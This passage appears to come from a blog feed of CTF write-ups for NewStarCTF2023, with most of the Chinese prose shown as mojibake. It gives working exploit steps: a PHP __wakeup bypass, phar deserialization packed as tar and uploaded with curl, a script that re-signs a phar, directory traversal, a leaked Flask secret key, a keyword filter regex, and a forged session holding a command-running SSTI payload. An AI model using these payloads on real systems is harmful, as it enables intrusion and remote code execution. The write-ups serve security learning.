å‡½æ•°åœ¨ååºåˆ—è¿‡ç¨‹ä¸­ä¼šæœ€å…ˆè°ƒç”¨,è¿™æ˜¯å› ä¸ºå¦‚æœå¯¹è±¡åœ¨è¢«åºåˆ—åŒ–æ—¶æŒæœ‰å¯¹æ•°æ®åº“è¿æ¥ã€æ–‡ä»¶å¥æŸ„æˆ–ç½‘ç»œè¿æ¥çš„å¼•ç”¨ï¼Œè¿™äº›èµ„æºåœ¨åºåˆ—åŒ–æ—¶ä¸ä¼šè¢«ä¿å­˜ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æ˜¯èµ„æºæŒ‡é’ˆã€‚å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œ <code>__wakeup()</code> æ–¹æ³•ä¼šé‡æ–°å»ºç«‹è¿™äº›è¿æ¥ã€‚</p><p><code>__wakeup()</code> é€šå¸¸åœ¨æ‰€æœ‰å±æ€§éƒ½æ¢å¤åæ‰§è¡Œã€‚å› æ­¤åœ¨ PHP ä¸­å¦‚æœåºåˆ—åŒ–å­—ç¬¦ä¸²è¢«ç¯¡æ”¹ï¼Œä¾‹å¦‚æ•…æ„å£°æ˜é”™è¯¯çš„å±æ€§æ•°(å®é™… 4 ä¸ªå±æ€§,å´å£°æ˜äº† 5 ä¸ª), PHP æ— æ³•æˆåŠŸæ¢å¤ 5 ä¸ªå˜é‡,å°±ä¼šè·³è¿‡ <code>__wakeup()</code> çš„æ‰§è¡Œã€‚</p><p>æ‰€ä»¥è¿™é‡Œåºåˆ—åŒ–æ„é€ ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åæ›´æ”¹ä¸€ä¸‹å±æ€§çš„ä¸ªæ•°å°±å¥½ã€‚</p><h3 id="phar-ååºåˆ—åŒ–"><a href="#phar-ååºåˆ—åŒ–" class="headerlink" title="phar ååºåˆ—åŒ–"></a>phar ååºåˆ—åŒ–</h3><p>æ³¨æ„åˆ°ä»£ç  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line"><span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„é€»è¾‘æ˜¯, ä» GET ä¸­å–å‡º <code>pear</code> çš„å€¼, ç„¶åé€šè¿‡<code>php://input</code> è¯»å– POST è¿‡æ¥çš„å†…å®¹, ç„¶åç”Ÿæˆä»¥ <code>pear</code> çš„å€¼å‘½å, POST ä¸ºå†…å®¹çš„æ–‡ä»¶, æ–‡ä»¶ä¼šå­˜æ”¾åœ¨å½“å‰ç›®å½•ä¸‹, ä¹‹åé€šè¿‡ GET ä¼ å…¥çš„ <code>apple</code> æ¥æŒ‡å®šæ–‡ä»¶è°ƒç”¨ <code>file_exists()</code> ã€‚</p><p><code>file_exists()</code> å‡½æ•°æ˜¯ä¸ªé­”æ³•å‡½æ•°, å½“ä»–è¯»å– phar æ–‡ä»¶æ—¶, å¦‚æœ phar æ–‡ä»¶å­˜åœ¨ <code>.metadata</code> , ä»–å°±ä¼šå¯¹é‡Œé¢çš„å†…å®¹æ‰§è¡Œååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æ€è·¯å¾ˆæ˜æ˜¾,è¿™é‡Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª phar æ–‡ä»¶,ä¸Šä¼ ,ç„¶åé€šè¿‡ <code>file_exists()</code> æ‰§è¡Œååºåˆ—åŒ–å®ç° RCEã€‚</p><h3 id="phar-æ–‡ä»¶ç­¾åç»•è¿‡"><a href="#phar-æ–‡ä»¶ç­¾åç»•è¿‡" class="headerlink" title="phar æ–‡ä»¶ç­¾åç»•è¿‡"></a>phar æ–‡ä»¶ç­¾åç»•è¿‡</h3><p>ç”±äºéœ€è¦ç»•è¿‡ <code>__wakeup()</code> å‡½æ•°, æˆ‘ä»¬è¦æ›´æ”¹ phar æ–‡ä»¶é‡Œé¢åºåˆ—åŒ–çš„å†…å®¹, ä½†æ˜¯æŒ‰ç…§æˆ‘çš„æ„é€  phar æ–‡ä»¶çš„æ–¹æ³•,åœ¨ phar æ–‡ä»¶åœ¨ç”Ÿæˆå, æ˜¯ä¼šæ ¹æ® phar æ–‡ä»¶çš„å†…å®¹ç”Ÿæˆä¸€ä¸ª<strong>ç­¾å</strong>çš„, å¦‚æœæˆ‘ä»¬ç¯¡æ”¹ç”Ÿæˆçš„ phar æ–‡ä»¶,ä¼šå¯¼è‡´ç­¾åæ ¡éªŒä¸é€šè¿‡, æ— æ³•è¢«è¯†åˆ«æˆä¸€ä¸ªæ­£ç¡®çš„ phar æ–‡ä»¶,ä¹Ÿå°±ä¸ä¼šè§¦å‘ååºåˆ—åŒ–.</p><p>è¿™é‡Œç»•è¿‡ç­¾åçš„æ–¹å¼æœ‰ä¸¤ç§:</p><ol><li>ä¿®æ”¹æ•°æ®åå†æ‰‹åŠ¨ç”Ÿæˆç­¾å</li><li>tarå‹ç¼©ç»•è¿‡</li></ol><p>æˆ‘çš„åšæ³•æ˜¯<strong>tarå‹ç¼©ç»•è¿‡</strong>, æ‰‹åŠ¨ç”Ÿæˆç­¾åçš„æ–¹æ³•ä¼šåœ¨æ–‡æœ«å†è®¨è®º.</p><p>è¿™é‡Œå¼•ç”¨äº†æ–‡ç«  <a href="https://www.anquanke.com/post/id/240007">https://www.anquanke.com/post/id/240007</a> çš„å†…å®¹ã€‚</p><p>phar æ–‡ä»¶åœ¨ç»è¿‡ tar å‹ç¼©å,ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè·³è¿‡ç­¾åçš„éªŒè¯ã€‚åŸå› æ˜¯å¯¹äº gzip,bzip æ–‡ä»¶, php å†…ç½®çš„ phar æ–‡ä»¶è¯»å–å‡½æ•°åœ¨ç¢°åˆ°ä»–ä»¬çš„æ—¶å€™ä¼šè°ƒç”¨å¯¹åº”çš„è¿‡æ»¤å™¨ç›´æ¥å¯¹ä»–ä»¬åšè§£å‹å¤„ç†,ç„¶ååœ¨å»ååºåˆ—åŒ–è§£å‹åçš„å†…å®¹,è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¼šéªŒè¯ç­¾åæœ‰æ•ˆæ€§çš„ã€‚è€Œå¯¹äº tar æ–‡ä»¶, ä»–ä¼šæ£€æŸ¥ tar å‹ç¼©åŒ…çš„å†…å®¹æ˜¯å¦æœ‰ <code>.phar/.metadata</code>, å¦‚æœæœ‰å°±ä¼šç›´æ¥å¯¹ <code>metadata</code> çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–, å¹¶æ²¡æœ‰éªŒè¯å…¶ç­¾åã€‚</p><p><strong>è¯·æ³¨æ„è¯¥åšä¸»å¯¹åˆ†æ tar æ–‡ä»¶æ—¶ä½¿ç”¨çš„ PHP ç‰ˆæœ¬ä¸º PHP7.2, æœ¬æ–‡å¹¶æ²¡æœ‰éªŒè¯ 7.2 ä»¥åçš„ PHP ç‰ˆæœ¬æ˜¯å¦æœ‰ä¿®å¤è¯¥æ¼æ´</strong></p><p>æœ¬é¢˜ä¸­çš„ PHP ç‰ˆæœ¬ä¸º PHP&#x2F;7.0.9, æ‰€ä»¥ç¡®ä¿èƒ½å¤Ÿä½¿ç”¨ tar å‹ç¼©ç»•è¿‡ç­¾åéªŒè¯ã€‚</p><p>è¿™é‡Œåœ¨è¿™é‡Œæˆ‘æ²¡æœ‰ä½¿ç”¨ php ä»£ç ç”Ÿæˆ phar æ–‡ä»¶, æˆ‘é€‰æ‹©å»æ¨¡æ‹Ÿphar æ–‡ä»¶çš„æ„é€ ,åŒæ—¶é‡Œé¢å¦‚æœæ²¡æœ‰ç­¾åä¹Ÿæ˜¯åˆæ³•çš„(å› ä¸ºæ ¹æœ¬å°±ä¸ä¼šæ£€æŸ¥,å¦‚æœæœ‰ç­¾å,tar ä½œä¸ºä¸€ä¸ªå¤–éƒ¨çš„å‘½ä»¤è¡Œå·¥å…·,ä¸çŸ¥é“ phar æ–‡ä»¶çš„æ„é€ ç»†èŠ‚,ç›´æ¥ tar å‹ç¼©å¯èƒ½æ— æ³•è¢«ååºåˆ—åŒ–æ‰§è¡Œ), è¿™é‡Œéœ€è¦åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º <code>.phar</code> çš„æ–‡ä»¶å¤¹, ç„¶ååœ¨æ–‡ä»¶å¤¹é‡Œåˆ›å»ºåä¸º <code>.metadata</code> çš„æ–‡ä»¶, é€šè¿‡ vim æ‰“å¼€, å°†åºåˆ—åŒ–ç»“æ„ç²˜è´´åˆ°é‡Œé¢,ç„¶åä¿å­˜ã€‚ä¹‹åè°ƒç”¨ä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ tar æ–‡ä»¶:</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf phar.tar .phar/</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ tar æ–‡ä»¶å, åœ¨ POST ä¸Šä¼ å³å¯(è¿™é‡Œç”¨äº† curl -T ä¸Šä¼ æ–‡ä»¶, å› ä¸º burp ä¸å¥½ææ ¼å¼):</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -T &quot;/Users/a214/Desktop/phar.tar&quot; &quot;http://f5c944ec-<span class="number">37</span>e2-<span class="number">4182</span>-bcaf-e7f3441012c9.node4.buuoj.cn:<span class="number">81</span>/pairing.php?pear=a.phar&amp;apple=phar://a.phar&quot; --header &quot;Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded&quot;</span><br></pre></td></tr></table></figure><p>æœ€åä¸Šä¼ å°±èƒ½ RCE äº†, ls çœ‹åˆ° flag åå­—å cat å°±èƒ½å¾—åˆ°ç»“æœ:</p><p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/result.jpg"></p><h2 id="å®˜æ–¹é¢˜è§£"><a href="#å®˜æ–¹é¢˜è§£" class="headerlink" title="å®˜æ–¹é¢˜è§£"></a>å®˜æ–¹é¢˜è§£</h2><p>å®˜æ–¹é¢˜è§£ä½¿ç”¨é‡å†™ phar æ–‡ä»¶ç­¾åçš„å½¢å¼, å»ä¸Šä¼ æ–‡ä»¶ã€‚ä½†æ˜¯æœ¬äººåœ¨å¤ç°çš„è¿‡ç¨‹ä¸­, ç¼•ç¼•ç¢°å£, åœ¨è¿™é‡Œè®°å½•æˆ‘çš„è¸©å‘å†å²ã€‚</p><h3 id="ä½¿ç”¨-010editor-æˆ–è€…å…¶ä»–äºŒè¿›åˆ¶å·¥å…·ç¼–è¾‘-phar-æ–‡ä»¶"><a href="#ä½¿ç”¨-010editor-æˆ–è€…å…¶ä»–äºŒè¿›åˆ¶å·¥å…·ç¼–è¾‘-phar-æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ 010editor æˆ–è€…å…¶ä»–äºŒè¿›åˆ¶å·¥å…·ç¼–è¾‘ phar æ–‡ä»¶"></a>ä½¿ç”¨ 010editor æˆ–è€…å…¶ä»–äºŒè¿›åˆ¶å·¥å…·ç¼–è¾‘ phar æ–‡ä»¶</h3><p>ä¸€èˆ¬çš„æ–‡æœ¬ç¼–è¾‘å™¨,åŒ…æ‹¬ vim, vscode, è‡ªå¸¦çš„è®°äº‹æœ¬å†ä¿å­˜çš„æ—¶å€™éƒ½ä¼šæ›´æ”¹æ–‡ä»¶çš„ç¼–ç æ ¼å¼,å¯¼è‡´å†å‘é€çš„è¿‡ç¨‹ä¸­æ— æ³•è¢«æ­£ç¡®è¯†åˆ«æˆ phar æ–‡ä»¶ã€‚</p><p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image.png"></p><h3 id="åœ¨ä¿®æ”¹å‰è¯·ç¡®è®¤ç­¾åæ‰€ä½¿ç”¨çš„åŠ å¯†æ ¼å¼"><a href="#åœ¨ä¿®æ”¹å‰è¯·ç¡®è®¤ç­¾åæ‰€ä½¿ç”¨çš„åŠ å¯†æ ¼å¼" class="headerlink" title="åœ¨ä¿®æ”¹å‰è¯·ç¡®è®¤ç­¾åæ‰€ä½¿ç”¨çš„åŠ å¯†æ ¼å¼"></a>åœ¨ä¿®æ”¹å‰è¯·ç¡®è®¤ç­¾åæ‰€ä½¿ç”¨çš„åŠ å¯†æ ¼å¼</h3><p>ç½‘ä¸ŠåŒ…æ‹¬å®˜æ–¹é¢˜è§£çš„ä»£ç éƒ½æ˜¯ç”¨ SHA1 è¿›è¡ŒåŠ å¯†, ä¸€ç›´ä¸èƒ½é€šè¿‡, è¿™ä¸€ç‚¹æˆ‘å¡äº†å¾ˆä¹…, çŸ¥é“æˆ‘ä»”ç»†çœ‹:</p><p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-1.png"></p><p>è¿™é‡Œçš„ç­¾åæ€ä¹ˆæ˜¯ 32 ä¸ªå­—èŠ‚çš„, ä¸€èˆ¬çš„ SHA1 åœ¨åŠ å¯†åæ˜¯ 20 ä¸ªå­—èŠ‚, <strong>SHA256</strong>åŠ å¯†åæ˜¯ 32 ä¸ªå­—èŠ‚, æ‰€ä»¥è¿™ç±»ç”±äºæœªçŸ¥åŸå› ,æœ¬äººæœ¬åœ° php ç¯å¢ƒç”Ÿæˆçš„ phar æ–‡ä»¶æ˜¯ç”¨<strong>SHA256</strong>è¿›è¡ŒåŠ å¯†çš„, æˆ‘ä»¬éœ€è¦æ›´æ”¹ä»£ç è®©ä»–å»ç”¨ SHA256 è¿›è¡ŒåŠ å¯†, ä»¥ä¸‹æ˜¯æ›´æ”¹åçš„åŠ å¯†ä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/a214/Documents/IntelliJ/unserialize/a.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">40</span>] <span class="comment"># 32+8</span></span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ sha256 æ›¿æ¢ sha1</span></span><br><span class="line">sig = hashlib.sha256(text).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥æ–°æ–‡ä»¶æ—¶ï¼ŒåŒ…æ‹¬äº†æ–°çš„ç­¾åå’Œæ–‡ä»¶æœ«å°¾çš„éç­¾åæ•°æ®</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(text + sig + end)</span><br></pre></td></tr></table></figure><p>æ›´æ”¹åä¸Šä¼ æ–‡ä»¶, å°±èƒ½æ‹¿åˆ° flag äº†:</p><p><img src="/2023/11/08/NewStarCTF2023-Unserialize-Again/image-2.png"></p><p>è¿™é‡Œæ€»ç»“ä¸€ä¸‹ç­¾åçš„åŠ å¯†æ ¼å¼:</p><p>ç­¾åæ”¯æŒ MD5, SHA1, SHA256, SHA512, OpenSSL ç®—æ³•, é»˜è®¤æ˜¯ SHA1</p><p>ä¸‹æ¬¡åœ¨æ”¹ç­¾åæ—¶è®°å¾—æ£€éªŒä¸€ä¸‹åŠ å¯†æ ¼å¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> ç­¾ååŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€NewStarCTF2023ã€‘Inject Me ç›®å½•ç©¿è¶Š+ssti+flask_jwt</title>
      <link href="/2023/11/07/NewStarCTF-Inject-Me/"/>
      <url>/2023/11/07/NewStarCTF-Inject-Me/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€NewStarCTF2023ã€‘Inject-Me-ç›®å½•ç©¿è¶Š-ssti-flask-jwt"><a href="#ã€NewStarCTF2023ã€‘Inject-Me-ç›®å½•ç©¿è¶Š-ssti-flask-jwt" class="headerlink" title="ã€NewStarCTF2023ã€‘Inject Me ç›®å½•ç©¿è¶Š+ssti+flask_jwt"></a>ã€NewStarCTF2023ã€‘Inject Me ç›®å½•ç©¿è¶Š+ssti+flask_jwt</h1><p>è¿›åˆ°é¶æœºå, ç¨å¾®æ¢ç´¢ä¸€ä¸‹,å‘ç°æœ‰ä¸ªè¿™ä¸ªå›¾ç‰‡æ³„éœ²äº†æºç :</p><p><img src="/2023/11/07/NewStarCTF-Inject-Me/image.png"></p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªç›®å½•ç©¿è¶Šæ¼æ´,å…¶ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸€è¡Œä»£ç æ˜¯å¯ä»¥åŒå†™ <code>../</code> æˆã€€<code>....//</code> è¿›è¡Œç»•è¿‡çš„.ç„¶åç”±äºè¿™æ˜¯ä¸€ä¸ª flask æ¡†æ¶,æˆ‘ä»¬å°è¯•å»æ‰¾å®ƒçš„ app.py æ–‡ä»¶, åœ¨å¯»æ‰¾ä¹‹å‰,å…ˆæ¥äº†è§£ flask æ¡†æ¶çš„æ–‡ä»¶ç»“æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/your-application</span><br><span class="line">    /venv                <span class="comment"># è™šæ‹Ÿç¯å¢ƒç›®å½•</span></span><br><span class="line">    /app                 <span class="comment"># åº”ç”¨æ¨¡å—ç›®å½•</span></span><br><span class="line">        __init__.py      <span class="comment"># åˆå§‹åŒ–åº”ç”¨å¹¶å¼•å…¥å„ä¸ªç»„ä»¶</span></span><br><span class="line">        /templates       <span class="comment"># Jinja2æ¨¡æ¿æ–‡ä»¶å¤¹</span></span><br><span class="line">            layout.html  <span class="comment"># åŸºæœ¬å¸ƒå±€æ¨¡æ¿</span></span><br><span class="line">            index.html   <span class="comment"># ä¸»é¡µæ¨¡æ¿</span></span><br><span class="line">            login.html   <span class="comment"># ç™»å½•é¡µé¢æ¨¡æ¿</span></span><br><span class="line">            ...</span><br><span class="line">        /static          <span class="comment"># é™æ€æ–‡ä»¶å¤¹ï¼ˆcss, js, imagesç­‰ï¼‰</span></span><br><span class="line">            /css         <span class="comment"># CSSæ–‡ä»¶</span></span><br><span class="line">            /js          <span class="comment"># JavaScriptæ–‡ä»¶</span></span><br><span class="line">            /images      <span class="comment"># å›¾ç‰‡æ–‡ä»¶</span></span><br><span class="line">            ...</span><br><span class="line">        views.py         <span class="comment"># è§†å›¾å‡½æ•°æ¨¡å—</span></span><br><span class="line">        models.py        <span class="comment"># æ•°æ®åº“æ¨¡å‹</span></span><br><span class="line">        forms.py         <span class="comment"># è¡¨å•ç±»</span></span><br><span class="line">    app.py               <span class="comment"># åº”ç”¨å¯åŠ¨å’Œé…ç½®</span></span><br><span class="line">    config.py            <span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">    requirements.txt     <span class="comment"># ä¾èµ–é¡¹åˆ—è¡¨æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½å®ç°ç›®å½•ç©¿è¶Š,é‚£ä¹ˆ <code>app.py</code> å’Œ <code>config.py</code> è¿™ä¸ªä¸¤ä¸ªæ–‡ä»¶å¯ä»¥ä¼˜å…ˆæŸ¥çœ‹.</p><p>æœ€åæ„é€  url è¯·æ±‚å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?file=....//....//app.py</span><br></pre></td></tr></table></figure><p>æˆåŠŸçœ‹åˆ°é¢˜ç›®æºç (è¿™é‡Œåªå¼ è´´æºç æœ‰æ„ä¹‰çš„éƒ¨åˆ†):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªä»£ç çš„é€»è¾‘å°±æ˜¯ä»cookie çš„ session é‡Œå–å‡º user, å¦‚æœ user ä¸ç­‰äº guest, å°±ç»è¿‡ä¸€å±‚è¿‡æ»¤ç„¶å <code>render_template_string</code> æ¸²æŸ“å‡ºæ¥.</p><p>è¿™é‡Œå°±æ˜¯ ssti ç»•è¿‡äº†, åŒæ—¶è¿˜è¦æ‰¾åˆ° <code>secret key</code> å»æ„é€  session.</p><p>å†æŸ¥çœ‹ <code>config.py</code> æ–‡ä»¶,å‘ç°:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ° secret_key, ç„¶åå°±æ˜¯å†™ä»£ç å»ç”Ÿæˆå¯¹åº”çš„ session. flask çš„ session ä¸æ™®é€šçš„ jwt ç”Ÿæˆä¸ä¸€æ ·, éœ€è¦å†™ä»£ç å»æ¨¡æ‹Ÿ session çš„ç­¾å.</p><p>è€Œä¸”è¿™ä¸€è¡Œä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ä¸€å †å…³é”®å­—, æˆ‘çš„å¤„ç†æ€è·¯å°±æ˜¯åœ¨ session é‡Œé¢ä¼ å…³é”®å­—,ç„¶ååœ¨ user é‡Œé¢è°ƒç”¨(å†™çš„è¿‡ç¨‹æ¯”è¾ƒæ¶å¿ƒ,è¦å»è®¡ç®—é—­åˆå’Œå¼•å·), æœ€åç”Ÿæˆ session çš„ä»£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flask sessionç”Ÿæˆä»£ç </span></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> URLSafeTimedSerializer</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = SECRET_KEY</span><br><span class="line"><span class="comment"># Flask ç”¨æ¥åºåˆ—åŒ– session æ•°æ®çš„æ¥å£</span></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"><span class="comment"># ä½¿ç”¨ä¸Šè¿° serializer æ¥ç”Ÿæˆ session</span></span><br><span class="line">session_data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;% print(&#x27;&#x27;[session[&#x27;a&#x27;]][session[&#x27;b&#x27;]][0][session[&#x27;c&#x27;]]()[117][session[&#x27;d&#x27;]][session[&#x27;e&#x27;]][session[&#x27;f&#x27;]](&#x27;more /y0U3_f14g_1s_h3re&#x27;)[session[&#x27;g&#x27;]]())%&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;b&quot;</span>:<span class="string">&#x27;__bases__&#x27;</span>,</span><br><span class="line">                <span class="string">&quot;c&quot;</span>:<span 